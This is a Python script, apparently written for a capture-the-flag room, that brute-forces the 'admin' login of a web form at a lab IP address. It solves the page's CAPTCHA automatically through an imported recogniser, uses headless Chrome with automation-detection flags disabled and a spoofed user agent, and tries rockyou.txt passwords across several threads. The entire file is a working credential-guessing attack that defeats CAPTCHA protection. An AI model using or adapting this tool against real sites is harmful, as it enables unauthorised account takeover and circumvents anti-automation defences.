from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
from process import read_captcha
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import sys

# ==================== CONFIGURATION ====================
TARGET_URL = "http://10.48.154.136/index.php"  # CHANGE THIS
WORDLIST_PATH = "/usr/share/wordlists/rockyou.txt"  # CHANGE THIS
TARGET_USERNAME = "admin"
MAX_PASSWORDS_TO_TRY = 100
MAX_WORKERS = 5  # Number of concurrent threads
WAIT_TIMEOUT = 10  # Selenium wait timeout

# ==================== GLOBAL STATE ====================
found_password_event = threading.Event()
found_password = ""
state_lock = threading.Lock()
attempt_count = 0

# ==================== UTILITIES ====================

def load_passwords(wordlist_path, limit=100):
    """Load passwords from wordlist file"""
    passwords = []
    try:
        with open(wordlist_path, "r", encoding='utf-8', errors='ignore') as f:
            for i, line in enumerate(f):
                if i >= limit:
                    break
                pwd = line.strip()
                if pwd:  # Skip empty lines
                    passwords.append(pwd)
        print(f"[*] Loaded {len(passwords)} passwords from wordlist")
        return passwords
    except FileNotFoundError:
        print(f"[!] Wordlist not found: {wordlist_path}")
        sys.exit(1)

def setup_driver():
    """Create and configure headless Chrome WebDriver"""
    options = Options()
    options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    
    return webdriver.Chrome(options=options)

def print_success(message):
    """Print green success message"""
    print(f"\033[92m{message}\033[00m")

def print_error(message):
    """Print red error message"""
    print(f"\033[91m{message}\033[00m")

def print_info(message):
    """Print blue info message"""
    print(f"\033[94m{message}\033[00m")

# ==================== MAIN BRUTEFORCE LOGIC ====================

def bruteforce(password):
    """
    Attempt login with given password
    
    Args:
        password: Password string to try
    """
    global attempt_count, found_password
    
    # Skip if password already found by another thread
    if found_password_event.is_set():
        return
    
    driver = None
    
    try:
        driver = setup_driver()
        
        while not found_password_event.is_set():
            try:
                # Load target page
                driver.get(TARGET_URL)
                
                # Wait for page animation (1s) then extra buffer
                time.sleep(1.5)
                
                # Wait for form elements to be present
                wait = WebDriverWait(driver, WAIT_TIMEOUT)
                username_field = wait.until(
                    EC.presence_of_element_located((By.ID, "username"))
                )
                password_field = driver.find_element(By.ID, "password")
                captcha_input = driver.find_element(By.ID, "captcha_input")
                submit_btn = driver.find_element(By.ID, "login-btn")
                
                # Extract CAPTCHA image
                captcha_element = driver.find_element(By.TAG_NAME, "img")
                captcha_png = captcha_element.screenshot_as_png
                
                # Recognize CAPTCHA text
                captcha_text = read_captcha(captcha_png)
                
                if not captcha_text:
                    print_error(f"[-] Could not read CAPTCHA for password: {password}")
                    break
                
                # Fill form
                username_field.clear()
                username_field.send_keys(TARGET_USERNAME)
                
                password_field.clear()
                password_field.send_keys(password)
                
                captcha_input.clear()
                captcha_input.send_keys(captcha_text)
                
                # Track attempt
                with state_lock:
                    attempt_count += 1
                    print_info(f"[Attempt {attempt_count}] Trying: {TARGET_USERNAME}:{password} | CAPTCHA: {captcha_text}")
                
                # Submit form
                submit_btn.click()
                
                # Wait for response
                time.sleep(2.5)
                
                # Check if redirected (successful login)
                current_url = driver.current_url
                
                if TARGET_URL not in current_url:
                    # Redirected - login successful!
                    print_success(f"\n{'='*60}")
                    print_success(f"[+] LOGIN SUCCESSFUL!")
                    print_success(f"[+] Username: {TARGET_USERNAME}")
                    print_success(f"[+] Password: {password}")
                    print_success(f"[+] CAPTCHA Read: {captcha_text}")
                    print_success(f"{'='*60}\n")
                    
                    with state_lock:
                        found_password = password
                    
                    found_password_event.set()
                    return
                
                # Still on login page - check error message
                try:
                    error_box = driver.find_element(By.ID, "error-box")
                    error_text = error_box.text.lower()
                    
                    if "incorrect" in error_text:
                        print_error(f"[!] CAPTCHA incorrect for {password}, retrying...")
                    else:
                        print_error(f"[-] Login failed for {password}: {error_box.text}")
                        break  # Try next password
                except:
                    # No error box found, likely incorrect password
                    print_error(f"[-] Login failed for {password}")
                    break  # Try next password
            
            except Exception as e:
                print_error(f"[!] Error during attempt with {password}: {str(e)}")
                break
    
    except Exception as e:
        print_error(f"[!] Thread error with {password}: {str(e)}")
    
    finally:
        if driver:
            try:
                driver.quit()
            except:
                pass

# ==================== MAIN ENTRY POINT ====================

def main():
    """Main execution function"""
    print_info(f"\n{'='*60}")
    print_info("CAPTCHApocalypse Brute Force Tool")
    print_info(f"Target: {TARGET_URL}")
    print_info(f"Username: {TARGET_USERNAME}")
    print_info(f"Max Workers: {MAX_WORKERS}")
    print_info(f"{'='*60}\n")
    
    # Load wordlist
    passwords = load_passwords(WORDLIST_PATH, MAX_PASSWORDS_TO_TRY)
    
    if not passwords:
        print_error("[!] No passwords loaded")
        return
    
    # Execute bruteforce with thread pool
    print_info(f"[*] Starting brute force with {len(passwords)} passwords...\n")
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {executor.submit(bruteforce, pwd): pwd for pwd in passwords}
        
        for future in as_completed(futures):
            try:
                future.result()
                if found_password_event.is_set():
                    # Cancel remaining tasks
                    for f in futures:
                        f.cancel()
                    break
            except Exception as e:
                print_error(f"[!] Worker thread error: {e}")
    
    # Final result
    print_info(f"{'='*60}")
    if found_password:
        print_success(f"[+] FINAL RESULT: Password Found = {found_password}")
    else:
        print_error(f"[-] FINAL RESULT: Password Not Found in Wordlist")
    print_info(f"[*] Total Attempts: {attempt_count}")
    print_info(f"{'='*60}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print_error("\n[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print_error(f"\n[!] Fatal error: {e}")
        sys.exit(1)
